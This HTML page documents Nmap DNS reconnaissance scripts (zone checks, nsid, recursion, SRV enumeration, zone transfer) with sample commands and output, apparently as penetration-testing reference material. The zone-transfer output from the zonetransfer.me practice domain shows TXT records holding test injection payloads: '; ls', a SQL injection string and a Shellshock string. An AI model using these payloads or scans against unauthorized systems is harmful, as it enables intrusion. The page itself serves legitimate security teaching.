<h4>DNS-Check-zone<a class="headerlink" href="#dns-check-zone" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-check-zone.html">dns-check-zone.nse</a> :  Checks DNS zone configuration against best practices, including RFC 1912. The configuration checks are divided into categories which each have a number of different tests.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sn</span> <span class="o">-</span><span class="n">Pn</span> <span class="n">aster</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">co</span><span class="o">.</span><span class="ow">in</span> <span class="o">--</span><span class="n">script</span> <span class="n">dns</span><span class="o">-</span><span class="n">check</span><span class="o">-</span><span class="n">zone</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=</span><span class="s1">&#39;dns-check-zone.domain=example.com&#39;</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">06</span> <span class="mi">09</span><span class="p">:</span><span class="mi">33</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">aster</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">co</span><span class="o">.</span><span class="ow">in</span> <span class="p">(</span><span class="mf">202.191</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span><span class="o">.</span>
<span class="n">Other</span> <span class="n">addresses</span> <span class="k">for</span> <span class="n">aster</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">co</span><span class="o">.</span><span class="ow">in</span> <span class="p">(</span><span class="ow">not</span> <span class="n">scanned</span><span class="p">):</span> <span class="mi">64</span><span class="p">:</span><span class="n">ff9b</span><span class="p">::</span><span class="n">cabf</span><span class="p">:</span><span class="mi">9</span><span class="n">a42</span>
<span class="n">rDNS</span> <span class="n">record</span> <span class="k">for</span> <span class="mf">202.191</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span> <span class="n">segment</span><span class="o">-</span><span class="mi">202</span><span class="o">-</span><span class="mf">191.</span><span class="n">sify</span><span class="o">.</span><span class="n">net</span>
<span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
<span class="o">|</span> <span class="n">dns</span><span class="o">-</span><span class="n">check</span><span class="o">-</span><span class="n">zone</span><span class="p">:</span>
<span class="o">|</span> <span class="n">DNS</span> <span class="n">check</span> <span class="n">results</span> <span class="k">for</span> <span class="n">domain</span><span class="p">:</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span>
<span class="o">|</span>   <span class="n">MX</span>
<span class="o">|</span>     <span class="n">PASS</span> <span class="o">-</span> <span class="n">Reverse</span> <span class="n">MX</span> <span class="n">A</span> <span class="n">records</span>
<span class="o">|</span>       <span class="n">All</span> <span class="n">MX</span> <span class="n">records</span> <span class="n">have</span> <span class="n">PTR</span> <span class="n">records</span>
<span class="o">|</span>   <span class="n">SOA</span>
<span class="o">|</span>     <span class="n">PASS</span> <span class="o">-</span> <span class="n">SOA</span> <span class="n">REFRESH</span>
<span class="o">|</span>       <span class="n">SOA</span> <span class="n">REFRESH</span> <span class="n">was</span> <span class="n">within</span> <span class="n">recommended</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">3600</span><span class="n">s</span><span class="p">)</span>
<span class="o">|</span>     <span class="n">PASS</span> <span class="o">-</span> <span class="n">SOA</span> <span class="n">RETRY</span>
<span class="o">|</span>       <span class="n">SOA</span> <span class="n">RETRY</span> <span class="n">was</span> <span class="n">within</span> <span class="n">recommended</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">600</span><span class="n">s</span><span class="p">)</span>
<span class="o">|</span>     <span class="n">PASS</span> <span class="o">-</span> <span class="n">SOA</span> <span class="n">EXPIRE</span>
<span class="o">|</span>         <span class="n">SOA</span> <span class="n">EXPIRE</span> <span class="n">was</span> <span class="n">within</span> <span class="n">recommended</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">1209600</span><span class="n">s</span><span class="p">)</span>
<span class="o">|</span>     <span class="n">PASS</span> <span class="o">-</span> <span class="n">SOA</span> <span class="n">MNAME</span> <span class="n">entry</span> <span class="n">check</span>
<span class="o">|</span>       <span class="n">SOA</span> <span class="n">MNAME</span> <span class="n">record</span> <span class="ow">is</span> <span class="n">listed</span> <span class="k">as</span> <span class="n">DNS</span> <span class="n">server</span>
<span class="o">|</span>     <span class="n">PASS</span> <span class="o">-</span> <span class="n">Zone</span> <span class="n">serial</span> <span class="n">numbers</span>
<span class="o">|</span>       <span class="n">Zone</span> <span class="n">serials</span> <span class="n">match</span>
<span class="o">|</span>   <span class="n">NS</span>
<span class="o">|</span>     <span class="n">FAIL</span> <span class="o">-</span> <span class="n">Recursive</span> <span class="n">queries</span>
<span class="o">|</span>       <span class="n">The</span> <span class="n">following</span> <span class="n">servers</span> <span class="n">allow</span> <span class="n">recursive</span> <span class="n">queries</span><span class="p">:</span> <span class="mf">45.33</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span>     <span class="n">PASS</span> <span class="o">-</span> <span class="n">Multiple</span> <span class="n">name</span> <span class="n">servers</span>
<span class="o">|</span>       <span class="n">Server</span> <span class="n">has</span> <span class="mi">2</span> <span class="n">name</span> <span class="n">servers</span>
<span class="o">|</span>     <span class="n">PASS</span> <span class="o">-</span> <span class="n">DNS</span> <span class="n">name</span> <span class="n">server</span> <span class="n">IPs</span> <span class="n">are</span> <span class="n">public</span>
<span class="o">|</span>       <span class="n">All</span> <span class="n">DNS</span> <span class="n">IPs</span> <span class="n">were</span> <span class="n">public</span>
<span class="o">|</span>     <span class="n">PASS</span> <span class="o">-</span> <span class="n">DNS</span> <span class="n">server</span> <span class="n">response</span>
<span class="o">|</span>       <span class="n">All</span> <span class="n">servers</span> <span class="n">respond</span> <span class="n">to</span> <span class="n">DNS</span> <span class="n">queries</span>
<span class="o">|</span>     <span class="n">PASS</span> <span class="o">-</span> <span class="n">Missing</span> <span class="n">nameservers</span> <span class="n">reported</span> <span class="n">by</span> <span class="n">parent</span>
<span class="o">|</span>       <span class="n">All</span> <span class="n">DNS</span> <span class="n">servers</span> <span class="n">match</span>
<span class="o">|</span>     <span class="n">PASS</span> <span class="o">-</span> <span class="n">Missing</span> <span class="n">nameservers</span> <span class="n">reported</span> <span class="n">by</span> <span class="n">your</span> <span class="n">nameservers</span>
<span class="o">|</span><span class="n">_</span>      <span class="n">All</span> <span class="n">DNS</span> <span class="n">servers</span> <span class="n">match</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">6.05</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
<div class="section" id="dns-nsid">
<h4>DNS-nsid<a class="headerlink" href="#dns-nsid" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-nsid.html">dns-nsid.nse</a> : Retrieves information from a DNS nameserver by requesting its nameserver ID (nsid) and asking for its id.server and version.bind values.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sSU</span> <span class="o">-</span><span class="n">p</span> <span class="mi">53</span> <span class="o">--</span><span class="n">script</span> <span class="n">dns</span><span class="o">-</span><span class="n">nsid</span> <span class="mf">202.191</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">06</span> <span class="mi">09</span><span class="p">:</span><span class="mi">37</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">segment</span><span class="o">-</span><span class="mi">202</span><span class="o">-</span><span class="mf">191.</span><span class="n">sify</span><span class="o">.</span><span class="n">net</span> <span class="p">(</span><span class="mf">202.191</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.097</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">53</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">domain</span>
<span class="mi">53</span><span class="o">/</span><span class="n">udp</span> <span class="nb">open</span>  <span class="n">domain</span>
<span class="o">|</span> <span class="n">dns</span><span class="o">-</span><span class="n">nsid</span><span class="p">:</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">bind</span><span class="o">.</span><span class="n">version</span><span class="p">:</span> <span class="mf">9.3</span><span class="o">.</span><span class="mi">3</span><span class="n">rc2</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">1.21</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
<div class="section" id="dns-recursion">
<h4>DNS-recursion<a class="headerlink" href="#dns-recursion" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-recursion.html">dns-recursion.nse</a> : Checks if a DNS server allows queries for third-party names. It is expected that recursion will be enabled on your own internal nameservers.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sU</span> <span class="o">-</span><span class="n">p</span> <span class="mi">53</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">dns</span><span class="o">-</span><span class="n">recursion</span> <span class="mf">202.191</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">06</span> <span class="mi">09</span><span class="p">:</span><span class="mi">39</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">segment</span><span class="o">-</span><span class="mi">202</span><span class="o">-</span><span class="mf">191.</span><span class="n">sify</span><span class="o">.</span><span class="n">net</span> <span class="p">(</span><span class="mf">202.191</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.094</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
<span class="mi">53</span><span class="o">/</span><span class="n">udp</span> <span class="nb">open</span>  <span class="n">domain</span>
<span class="o">|</span><span class="n">_dns</span><span class="o">-</span><span class="n">recursion</span><span class="p">:</span> <span class="n">Recursion</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">enabled</span>

<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">1.14</span> <span class="n">seconds</span>
</pre></div>
</div>
</div>
<div class="section" id="dns-service-discovery">
<h4>DNS-Service-Discovery<a class="headerlink" href="#dns-service-discovery" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-service-discovery.html">dns-service-discovery.nse</a> : Attempts to discover target hosts&#8217; services using the DNS Service Discovery protocol. The script first sends a query for _services._dns-sd._udp.local to get a list of services. It then sends a followup query for each one to try to get more information.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Yet</span> <span class="n">to</span> <span class="n">run</span>
<span class="n">nmap</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">dns</span><span class="o">-</span><span class="n">service</span><span class="o">-</span><span class="n">discovery</span> <span class="o">-</span><span class="n">p</span> <span class="mi">5353</span> <span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span>
</pre></div>
</div>
</div>
<div class="section" id="dns-srv-enum">
<h4>DNS-SRV-Enum<a class="headerlink" href="#dns-srv-enum" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-srv-enum.html">dns-srv-enum.nse</a> : Enumerates various common service (SRV) records for a given domain name. The service records contain the hostname, port and priority of servers for a given service. The following services are enumerated by the script:</p>
<ul class="simple">
<li>Active Directory Global Catalog</li>
<li>Exchange Autodiscovery</li>
<li>Kerberos KDC Service</li>
<li>Kerberos Passwd Change Service</li>
<li>LDAP Servers</li>
<li>SIP Servers</li>
<li>XMPP S2S</li>
<li>XMPP C2S</li>
</ul>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Yet</span> <span class="n">to</span> <span class="n">run</span>
</pre></div>
</div>
</div>
<div class="section" id="dns-zone-transfer">
<h4>DNS-Zone-Transfer<a class="headerlink" href="#dns-zone-transfer" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/dns-zone-transfer.html">dns-zone-transfer.nse</a> : Requests a zone transfer (AXFR) from a DNS server.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span> <span class="n">dns</span><span class="o">-</span><span class="n">zone</span><span class="o">-</span><span class="n">transfer</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span> <span class="n">dns</span><span class="o">-</span><span class="n">zone</span><span class="o">-</span><span class="n">transfer</span><span class="o">.</span><span class="n">domain</span><span class="o">=</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span> <span class="n">nsztm2</span><span class="o">.</span><span class="n">digi</span><span class="o">.</span><span class="n">ninja</span>

<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">06</span> <span class="mi">09</span><span class="p">:</span><span class="mi">49</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">nsztm2</span><span class="o">.</span><span class="n">digi</span><span class="o">.</span><span class="n">ninja</span> <span class="p">(</span><span class="mf">167.88</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">)</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.29</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Other</span> <span class="n">addresses</span> <span class="k">for</span> <span class="n">nsztm2</span><span class="o">.</span><span class="n">digi</span><span class="o">.</span><span class="n">ninja</span> <span class="p">(</span><span class="ow">not</span> <span class="n">scanned</span><span class="p">):</span> <span class="mi">64</span><span class="p">:</span><span class="n">ff9b</span><span class="p">::</span><span class="n">a758</span><span class="p">:</span><span class="mi">2</span><span class="n">a5e</span>
<span class="n">rDNS</span> <span class="n">record</span> <span class="k">for</span> <span class="mf">167.88</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">996</span> <span class="n">closed</span> <span class="n">ports</span>
<span class="n">PORT</span>     <span class="n">STATE</span>    <span class="n">SERVICE</span>
<span class="mi">53</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>     <span class="n">domain</span>
<span class="o">|</span> <span class="n">dns</span><span class="o">-</span><span class="n">zone</span><span class="o">-</span><span class="n">transfer</span><span class="p">:</span>
<span class="o">|</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                                <span class="n">SOA</span>    <span class="n">nsztm1</span><span class="o">.</span><span class="n">digi</span><span class="o">.</span><span class="n">ninja</span><span class="o">.</span> <span class="n">robin</span><span class="o">.</span><span class="n">digi</span><span class="o">.</span><span class="n">ninja</span><span class="o">.</span>
<span class="o">|</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                                <span class="n">HINFO</span>  <span class="s2">&quot;Casio fx-700G&quot;</span> <span class="s2">&quot;Windows XP&quot;</span>
<span class="o">|</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                                <span class="n">TXT</span>    <span class="s2">&quot;google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA&quot;</span>
<span class="o">|</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                                <span class="n">MX</span>     <span class="mi">0</span> <span class="n">ASPMX</span><span class="o">.</span><span class="n">L</span><span class="o">.</span><span class="n">GOOGLE</span><span class="o">.</span><span class="n">COM</span><span class="o">.</span>
<span class="o">|</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                                <span class="n">MX</span>     <span class="mi">10</span> <span class="n">ALT1</span><span class="o">.</span><span class="n">ASPMX</span><span class="o">.</span><span class="n">L</span><span class="o">.</span><span class="n">GOOGLE</span><span class="o">.</span><span class="n">COM</span><span class="o">.</span>
<span class="o">|</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                                <span class="n">MX</span>     <span class="mi">10</span> <span class="n">ALT2</span><span class="o">.</span><span class="n">ASPMX</span><span class="o">.</span><span class="n">L</span><span class="o">.</span><span class="n">GOOGLE</span><span class="o">.</span><span class="n">COM</span><span class="o">.</span>
<span class="o">|</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                                <span class="n">MX</span>     <span class="mi">20</span> <span class="n">ASPMX2</span><span class="o">.</span><span class="n">GOOGLEMAIL</span><span class="o">.</span><span class="n">COM</span><span class="o">.</span>
<span class="o">|</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                                <span class="n">MX</span>     <span class="mi">20</span> <span class="n">ASPMX3</span><span class="o">.</span><span class="n">GOOGLEMAIL</span><span class="o">.</span><span class="n">COM</span><span class="o">.</span>
<span class="o">|</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                                <span class="n">MX</span>     <span class="mi">20</span> <span class="n">ASPMX4</span><span class="o">.</span><span class="n">GOOGLEMAIL</span><span class="o">.</span><span class="n">COM</span><span class="o">.</span>
<span class="o">|</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                                <span class="n">MX</span>     <span class="mi">20</span> <span class="n">ASPMX5</span><span class="o">.</span><span class="n">GOOGLEMAIL</span><span class="o">.</span><span class="n">COM</span><span class="o">.</span>
<span class="o">|</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                                <span class="n">A</span>      <span class="mf">217.147</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                                <span class="n">NS</span>     <span class="n">nsztm1</span><span class="o">.</span><span class="n">digi</span><span class="o">.</span><span class="n">ninja</span><span class="o">.</span>
<span class="o">|</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                                <span class="n">NS</span>     <span class="n">nsztm2</span><span class="o">.</span><span class="n">digi</span><span class="o">.</span><span class="n">ninja</span><span class="o">.</span>
<span class="o">|</span> <span class="n">_sip</span><span class="o">.</span><span class="n">_tcp</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                      <span class="n">SRV</span>    <span class="mi">0</span> <span class="mi">0</span> <span class="mi">5060</span> <span class="n">www</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>
<span class="o">|</span> <span class="mf">157.177</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">IN</span><span class="o">-</span><span class="n">ADDR</span><span class="o">.</span><span class="n">ARPA</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>   <span class="n">PTR</span>    <span class="n">www</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>
<span class="o">|</span> <span class="n">asfdbauthdns</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                   <span class="n">AFSDB</span>  <span class="mi">1</span> <span class="n">asfdbbox</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>
<span class="o">|</span> <span class="n">asfdbbox</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                       <span class="n">A</span>      <span class="mf">127.0</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span> <span class="n">asfdbvolume</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                    <span class="n">AFSDB</span>  <span class="mi">1</span> <span class="n">asfdbbox</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>
<span class="o">|</span> <span class="n">canberra</span><span class="o">-</span><span class="n">office</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                <span class="n">A</span>      <span class="mf">202.14</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span> <span class="n">cmdexec</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                        <span class="n">TXT</span>    <span class="s2">&quot;; ls&quot;</span>
<span class="o">|</span> <span class="n">contact</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                        <span class="n">TXT</span>    <span class="s2">&quot;Remember to call or email Pippa on +44 123 4567890 or pippa@zonetransfer.me when making DNS changes&quot;</span>
<span class="o">|</span> <span class="n">dc</span><span class="o">-</span><span class="n">office</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                      <span class="n">A</span>      <span class="mf">143.228</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span> <span class="n">deadbeef</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                       <span class="n">AAAA</span>   <span class="n">dead</span><span class="p">:</span><span class="n">beaf</span><span class="p">::</span>
<span class="o">|</span> <span class="n">dr</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                             <span class="n">LOC</span>    <span class="mf">53.349044</span> <span class="n">N</span> <span class="mf">1.642646</span> <span class="n">W</span> <span class="mi">0</span><span class="n">m</span> <span class="mf">1.0</span><span class="n">m</span> <span class="mf">10000.0</span><span class="n">m</span> <span class="mf">10.0</span><span class="n">m</span>
<span class="o">|</span> <span class="n">DZC</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                            <span class="n">TXT</span>    <span class="s2">&quot;AbCdEfG&quot;</span>
<span class="o">|</span> <span class="n">email</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                          <span class="n">NAPTR</span>  <span class="mi">1</span> <span class="mi">1</span> <span class="s2">&quot;P&quot;</span> <span class="s2">&quot;E2U+email&quot;</span> <span class="s2">&quot;&quot;</span> <span class="n">email</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>
<span class="o">|</span> <span class="n">email</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                          <span class="n">A</span>      <span class="mf">74.125</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span> <span class="n">Info</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                           <span class="n">TXT</span>    <span class="s2">&quot;ZoneTransfer.me service provided by Robin Wood - robin@digi.ninja. See http://digi.ninja/projects/zonetransferme.php for more information.&quot;</span>
<span class="o">|</span> <span class="n">internal</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                       <span class="n">NS</span>     <span class="n">intns1</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>
<span class="o">|</span> <span class="n">internal</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                       <span class="n">NS</span>     <span class="n">intns2</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>
<span class="o">|</span> <span class="n">intns1</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                         <span class="n">A</span>      <span class="mf">167.88</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span> <span class="n">intns2</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                         <span class="n">A</span>      <span class="mf">167.88</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span> <span class="n">office</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                         <span class="n">A</span>      <span class="mf">4.23</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span> <span class="n">ipv6actnow</span><span class="o">.</span><span class="n">org</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                 <span class="n">AAAA</span>   <span class="mi">2001</span><span class="p">:</span><span class="mi">67</span><span class="n">c</span><span class="p">:</span><span class="mf">2e8</span><span class="p">:</span><span class="mi">11</span><span class="p">::</span><span class="n">c100</span><span class="p">:</span><span class="mi">1332</span>
<span class="o">|</span> <span class="n">owa</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                            <span class="n">A</span>      <span class="mf">207.46</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="o">|</span> <span class="n">robinwood</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                      <span class="n">TXT</span>    <span class="s2">&quot;Robin Wood&quot;</span>
<span class="o">|</span> <span class="n">rp</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                             <span class="n">RP</span>     <span class="n">robin</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span> <span class="n">robinwood</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>
<span class="o">|</span> <span class="n">sip</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                            <span class="n">NAPTR</span>  <span class="mi">2</span> <span class="mi">3</span> <span class="s2">&quot;P&quot;</span> <span class="s2">&quot;E2U+sip&quot;</span> <span class="s2">&quot;!^.*$!sip:customer-service@zonetransfer.me!&quot;</span> <span class="o">.</span>
<span class="o">|</span> <span class="n">sqli</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                           <span class="n">TXT</span>    <span class="s2">&quot;&#39; or 1=1 --&quot;</span>
<span class="o">|</span> <span class="n">sshock</span><span class="o">.</span><span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>                         <span class="n">TXT</span>    <span class="s2">&quot;() { :]}; echo ShellShocked&quot;</span>
